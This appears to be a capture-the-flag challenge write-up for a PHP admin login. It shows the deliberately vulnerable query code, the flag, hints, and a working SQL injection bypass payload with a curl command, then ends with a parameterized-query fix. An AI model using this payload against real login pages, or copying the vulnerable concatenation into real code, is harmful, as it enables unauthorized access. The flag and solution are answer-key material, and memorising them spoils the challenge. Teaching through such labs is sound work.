# 🚪 Challenge 0 — The Lock That Learned One Trick

> **Vector:** SQL Injection (Authentication Bypass) · **Endpoint:** `POST /` (fields `username`, `password`)

*(alt titles: "No Comment" · "The Bouncer Got a Memo" · "Think Past the Patch")*

> 🎓 **Warm-up first:** try the guided demo at **`/demo`** — it teaches the classic comment trick. This real login has been *patched* against exactly that trick, so you'll need to adapt.

---

## 📝 Description
The Sentinel admin portal still repeats whatever you type straight into its database — but someone "fixed" it by scrubbing out SQL comments. The comment trick from the demo now hits a wall. The underlying flaw is still wide open, though. You'll just have to *think past the patch*.

Your mission: log in as **admin** without the password. The door is at `POST /`.

## 🧩 Vulnerable Code
**`login-app/index.php`**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // "Hardening": strip SQL comment sequences so  admin'--  no longer works …
    $strip = ['--', '#', '/*', '*/'];
    $username = str_replace($strip, '', $username);   // ◀ comment trick neutralised
    $password = str_replace($strip, '', $password);

    // … but input is STILL concatenated into the query — boolean injection remains.
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";  // ◀ VULNERABLE

    $user = $db->query($query)->fetch(PDO::FETCH_ASSOC);
    if ($user) {
        $_SESSION['authed'] = true;
        $_SESSION['user']   = $user['username'];
        header('Location: /');   // ✅ authenticated
        exit;
    } else {
        $error = 'Invalid username or password.';
    }
}
```

## 🚩 Flag
```
CTF{8ee4d84cbeef15123c24791da26006d9}
```
*(from `flags/flag_login.txt`)*

## 💡 Hints
- **Nudge:** The comment trick (`admin'-- `) is dead — `--`, `#`, `/* */` are stripped before the query runs. But your input still lands *inside* the SQL. You don't need a comment to break logic.
- **Warmer:** Instead of *commenting out* the password check, make the `WHERE` clause true another way. Remember SQL precedence: `AND` binds **tighter** than `OR`.
- **Gotcha:** A bare `' OR '1'='1` **won't** work here — because of precedence it becomes `username='' OR ('1'='1' AND password='…')`, and the password half is still false. You must make the *username* side true.
- **The key:** target admin directly so the OR wins regardless of the password:
  ```bash
  # username field:
  curl -s -X POST "http://<host>/" \
    --data-urlencode "username=admin' OR '1'='1" \
    --data-urlencode "password=whatever"

  # alt — inject in the PASSWORD field instead:
  #   username=admin   password=' OR '1'='1
  ```

## 🔍 Vulnerable Line Explanation
**`login-app/index.php`** — comment sequences are stripped, *then* the raw input is still concatenated into the SQL:
```php
$username = str_replace(['--','#','/*','*/'], '', $username);
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```
Stripping comments only removes *one* exploitation path. Because the value is still placed inside the query, you can rewrite the boolean logic instead.

| You send (username) | Query becomes | Result |
|---|---|---|
| `admin'-- ` | `… username = 'admin' AND password = '…'` | `--` removed → no comment → normal query → **fails** (wrong password). |
| `' OR '1'='1` | `… username = '' OR '1'='1' AND password = '…'` | precedence → `'' OR ('1'='1' AND pw)` → pw false → **fails**. |
| `admin' OR '1'='1` | `… username = 'admin' OR '1'='1' AND password = '…'` | `username='admin'` is true → `true OR (…)` → **logs in as admin** ✅ |

**Fix:** blacklisting characters/keywords is not a fix. Use a parameterized query — `WHERE username = ? AND password = ?` — and store salted password hashes.
